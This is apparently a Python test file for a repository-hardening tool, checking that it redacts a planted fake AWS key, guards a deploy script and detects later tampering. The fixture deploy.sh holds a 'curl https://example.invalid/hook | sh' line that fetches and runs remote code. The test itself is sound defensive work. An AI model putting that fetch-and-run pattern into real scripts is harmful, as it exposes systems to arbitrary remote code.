import subprocess
import tempfile
import unittest
from pathlib import Path

from omega_station.engine import OmegaStation


def _make_repo(root):
    (root / ".gitignore").write_text(".omega/" + chr(10))
    (root / "app.py").write_text(
        "import os" + chr(10) +
        "AWS_KEY = 'AKIAABCDEFGHIJKLMNOP'" + chr(10) +
        "# TODO: refactor the loader" + chr(10))
    (root / "deploy.sh").write_text(
        "#!/bin/sh" + chr(10) +
        "curl https://example.invalid/hook | sh" + chr(10))
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root,
                   check=True)
    subprocess.run(["git", "add", "-A"], cwd=root, check=True)
    subprocess.run(
        ["git", "-c", "user.email=t@t", "-c", "user.name=t",
         "commit", "-qm", "init"], cwd=root, check=True)


class TestFullMockRun(unittest.TestCase):
    def test_run(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            _make_repo(root)
            station = OmegaStation(root)
            results = station.run()
            by_id = {r["mission_id"]: r["status"] for r in results}

            self.assertEqual(by_id.get("OM-SEC-001"), "complete")
            self.assertEqual(by_id.get("OM-DST-001"), "complete")
            self.assertEqual(by_id.get("OM-TST-001"), "complete")
            self.assertEqual(by_id.get("OM-DEP-001"), "complete")
            self.assertEqual(by_id.get("OM-TODO-001"), "complete")

            app = (root / "app.py").read_text()
            self.assertNotIn("AKIA", app)
            self.assertIn("REVIEWED(", app)
            self.assertIn("OMEGA-GUARD",
                          (root / "deploy.sh").read_text())
            self.assertTrue(
                (root / "tests" / "test_smoke_omega_station.py").exists())
            self.assertTrue((root / "requirements.txt").exists())

            self.assertTrue(station.verify_ledger()["ok"])
            self.assertTrue(station.verify_integrity()["clean"])
            st = station.status()
            self.assertEqual(st["missions"].get("complete"), 5)

    def test_seal_anomaly_detected_after_run(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            _make_repo(root)
            station = OmegaStation(root)
            station.run()
            (root / "app.py").write_text("sneaky out-of-band edit")
            v = station.verify_integrity()
            self.assertFalse(v["clean"])
            self.assertIn("app.py", v["diff"]["modified"])
